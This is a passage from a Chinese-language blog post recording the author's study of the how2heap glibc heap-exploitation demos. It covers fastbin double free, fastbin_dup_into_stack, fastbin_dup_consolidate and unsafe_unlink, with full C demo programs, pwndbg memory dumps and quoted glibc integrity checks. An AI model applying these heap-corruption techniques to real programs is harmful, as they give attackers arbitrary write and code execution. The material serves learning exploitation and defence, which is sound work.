7fe8493f4000-7fe8493f8000 rw-p 00000000 00:00 0 
7fe8493f8000-7fe84941e000 r-xp 00000000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so
7fe8495ff000-7fe849602000 rw-p 00000000 00:00 0 
7fe84961c000-7fe84961d000 rw-p 00000000 00:00 0 
7fe84961d000-7fe84961e000 r--p 00025000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so
7fe84961e000-7fe84961f000 rw-p 00026000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so
7fe84961f000-7fe849620000 rw-p 00000000 00:00 0 
7fff56009000-7fff5602a000 rw-p 00000000 00:00 0                          [stack]
7fff56128000-7fff5612b000 r--p 00000000 00:00 0                          [vvar]
7fff5612b000-7fff5612d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    14401 abort (core dumped)  ./fastbin_dup
</code></pre><p>这是因为glibc内在free同一个chunk时做了处理:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>由于fastbins是一个后进先出(LIFO)的结构, 处于链表头的总是最先被free的chunk</p>
<p>因此我们先free第一个chunk, 之后free第二个chunk, 接着就可以再次free第一个chunk了</p>
<p>因为glibc并未对后续堆块进行检查, 仅检查了最前面的chunk</p>
<pre><code>➜  how2heap git:(master) ✗ ./fastbin_dup                 
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x1101010
2nd malloc(8): 0x1101030
3rd malloc(8): 0x1101050
Freeing the first one...
If we free 0x1101010 again, things will crash because 0x1101010 is at the top of the free list.
So, instead, we&#39;ll free 0x1101030.
Now, we can free 0x1101010 again, since it&#39;s not the head of the free list.
Now the free list has [ 0x1101010, 0x1101030, 0x1101010 ]. If we malloc 3 times, we&#39;ll get 0x1101010 twice!
1st malloc(8): 0x1101010
2nd malloc(8): 0x1101030
3rd malloc(8): 0x1101010
</code></pre><p>加上注释以后可以看到, 在free了两次第一个堆块(0x1101010)后, fastbins的链表中保存了两次这个chunk</p>
<p>按照free的先后顺序, 即0x1101010 -&gt; 0x1101030 -&gt; 0x1101010</p>
<p>在pwndbg中可以看到:</p>
<pre><code>pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre><p>此时, 如果我们malloc三个chunk, 将会从fastbins的链表中返回chunk</p>
<p>可以在输出结果中看到0x1101010这个chunk被返回了两次</p>
<p>同样的, 如果加上内存检测参数<code>-fsanitize=address -g</code>会提示有double-free漏洞</p>
<h2 id="0x06-fastbin-dup-into-stack"><a href="#0x06-fastbin-dup-into-stack" class="headerlink" title="0x06 fastbin_dup_into_stack"></a>0x06 fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var = <span class="number">0x21</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 4 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    *d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4nd malloc(9) %p points to %p\n"</span>, d, &amp;d);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s\n"</span>, f, f);</span><br><span class="line">    <span class="keyword">char</span> *g = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(g, <span class="string">"GGGGGGGG"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"7th malloc(9) %p points to %s\n"</span>, g, g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个程序展示了如何通过修改fd指针在栈上伪造一个free chunk</p>
<p>在malloc了3个chunk并且复制了3个字符串进去后:</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x4141414141414141    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000021
0x602050:    0x4343434343434343    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1
</code></pre><p>对第一个chunk double free后:</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x0000000000602020    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021
0x602030:    0x0000000000602000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000021
0x602050:    0x4343434343434343    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1

pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
</code></pre><p>接着malloc一个chunk, 内容为栈地址(stack_var - 0x08)</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x00007fffffffdd90    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021
0x602030:    0x0000000000602000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000021
0x602050:    0x4343434343434343    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1
</code></pre><p>可以看到, 第一个chunk被重新分配, 并保存了我们的栈顶地址(rsp)</p>
<p>这也是为什么stack_var被设置为0x21(0x20也可以), 设置一个和之前chunk大小相同的size</p>
<pre><code>pwndbg&gt; stack
00:0000│ rsp  0x7fffffffdd90 ◂— 0x0
01:0008│      0x7fffffffdd98 ◂— 0x21 /* &#39;!&#39; */
02:0010│      0x7fffffffdda0 —▸ 0x602010 —▸ 0x7fffffffdd90 ◂— 0x0
pwndbg&gt; x/20gx 0x7fffffffdd90
0x7fffffffdd90:    0x0000000000000000    0x0000000000000021 &lt;------------------ fake chunk
0x7fffffffdda0:    0x0000000000602010    0x0000000000602010
</code></pre><p>glibc 在执行分配操作时，若块的大小符合 fast bin，则会在对应的 bin 中寻找合适的块，此时 glibc 将根据候选块的 size 字段计算出 fastbin 索引，然后与对应 bin 在 fastbin 中的索引进行比较，如果二者不匹配，则说明块的 size 字段遭到破坏。所以需要 fake chunk 的 size 字段被设置为正确的值。</p>
<p>glibc 检查代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      [...]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">              [...]</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>由于我们对第一个chunk进行了两次free, 那么在第四次malloc并把栈地址输入进去的时候, 伪造的chunk实际上替代了第二次free第一个malloc的chunk</p>
<p>这时候的fastbins链表是一个正常的fastbins链表(没有double free的bin)</p>
<pre><code>pwndbg&gt; fastbins 
fastbins
0x20: 0x602020 —▸ 0x602000 —▸ 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0
</code></pre><p>可以看到伪造的chunk已经放在fastbins里了</p>
<p>我们这时再进行两次malloc, 取出第一次和第二次free的chunk, 将伪造的chunk放在表头</p>
<pre><code>pwndbg&gt; fastbins 
fastbins
0x20: 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0
</code></pre><p>然后malloc一次, 即可在fake chunk处分配内存</p>
<pre><code>pwndbg&gt; x/20gx 0x7fffffffdd90 (stack)
0x7fffffffdd90:    0x0000000000000000    0x0000000000000021
0x7fffffffdda0:    0x4747474747474747    0x0000000000602010
0x7fffffffddb0:    0x0000000000602030    0x0000000000602050
0x7fffffffddc0:    0x0000000000602030    0x0000000000602010
0x7fffffffddd0:    0x00007fffffffdda0    0x3bfa61ab402a0700
</code></pre><h2 id="0x07-fastbin-dup-consolidate"><a href="#0x07-fastbin-dup-consolidate" class="headerlink" title="0x07 fastbin_dup_consolidate"></a>0x07 fastbin_dup_consolidate</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p1, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p2, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p4, <span class="string">"CCCCCCC"</span>);</span><br><span class="line">    <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p5, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, p4, p5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序malloc了两个0x10的chunk</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021 &lt;--------------------- p1
0x602010:    0x4141414141414141    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021 &lt;--------------------- p2
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000020fc1
</code></pre><p>free p1</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000021
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000020fc1
pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 ◂— 0x0
</code></pre><p>malloc p3(0x500)</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x00007ffff7dd1b88    0x00007ffff7dd1b88
0x602020:    0x0000000000000020    0x0000000000000020
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000411
pwndbg&gt; fastbins 
fastbins
0x20: 0x0
pwndbg&gt; smallbins 
smallbins
0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
</code></pre><p>可以看到, malloc了一个0x400的大chunk后, fastbins中保存的p1的chunk消失了</p>
<p>出现在了smallbins中, 并且chunk p2的size和prev size都被修改了</p>
<p>large chunk的分配机制:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>翻译一哈(google机翻233:</p>
<pre><code>如果这是一个大内存的分配请求(large chunk)，将在继续之前合并fastbins。 
虽然在查看是否有可用空间之前杀死所有fastbins可能看起来过多，但这可以避免通常与fastbins相关的碎片问题。
此外，在实践中，程序往往会有小型或大型请求，但混合次数较少，因此在大多数程序中通常不会调用整合。 
而在其他情况下经常调用的程序往往会碎片化。
</code></pre><p>当分配large chunk的时候, 首先根据chunk的大小获得对应的large bin的index</p>
<pre><code>malloc_state结构体中`mchunkptr bins[NBINS * 2 - 2];`保存了除了fastbin的其他bin

即small bin, large bin, unsorted bin, 都使用的是双向链表

下标1是unsorted bin, 2~63是small bin, 64~126是large bin
</code></pre><p>之后呢, 判断fastbins中是否包含chunk, 如果有的话会调用malloc_consolidate合并fastbins的chunk, 加入到unsorted bins中</p>
<p>由于我们分配的是一个0x400大小的chunk, 适合small bin( &lt; 512byte)</p>
<p>所以会从unsorted bin中返回到small bin</p>
<p>由于此时p1 chunk不在fastbins的表头, 可以再次free</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x0000000000000000    0x00007ffff7dd1b88
0x602020:    0x0000000000000020    0x0000000000000020
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000411
pwndbg&gt; fastbins 
fastbins
0x20: 0x602000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg&gt; smallbins 
smallbins
0x20 [corrupted]
FD: 0x602000 ◂— 0x0
BK: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
</code></pre><p>一个在fastbins中, 一个在smallbins中. malloc一次并放入字符串CCCCCCC</p>
<pre><code>0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x0043434343434343    0x00007ffff7dd1b88
0x602020:    0x0000000000000020    0x0000000000000020
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000411
</code></pre><p>第二次malloc, 放入字符串DDDDDDD</p>
<pre><code>pwndbg&gt; x/20gx 0x602000
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x4444444444444444    0x00007ffff7dd1b88
0x602020:    0x0000000000000020    0x0000000000000021
0x602030:    0x4242424242424242    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000411
</code></pre><p>可以看到两次malloc并修改的实际上是同一个chunk</p>
<h2 id="0x08-unsafe-unlink"><a href="#0x08-unsafe-unlink" class="headerlink" title="0x08 unsafe_unlink"></a>0x08 unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// not fastbins</span></span><br><span class="line">    <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span></span><br><span class="line">    chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>, (<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>, (<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False</span></span><br><span class="line">    <span class="comment">// chunk0_ptr[1] = 0x0; // or 0x8, 0x80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">    chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">    chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deal with tcache</span></span><br><span class="line">    <span class="comment">// int *a[10];</span></span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; 7; i++) &#123;</span></span><br><span class="line">    <span class="comment">//   a[i] = malloc(0x80);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; 7; i++) &#123;</span></span><br><span class="line">    <span class="comment">//   free(a[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> victim_string[<span class="number">9</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(victim_string, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>, victim_string);</span><br><span class="line"></span><br><span class="line">    chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4242424242424242</span>LL;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>, victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>$ gcc -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
</code></pre><p>这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。</p>
<p>该技术最常见的利用场景是我们有一个可以溢出漏洞和一个全局指针。</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-fastbin-dup-consolidate"><span class="toc-number">7.</span> <span class="toc-text">0x07 fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-unsafe-unlink"><span class="toc-number">8.</span> <span class="toc-text">0x08 unsafe_unlink</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=How2heap 学习记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=How2heap 学习记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=How2heap 学习记录&body=Check out this article: http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
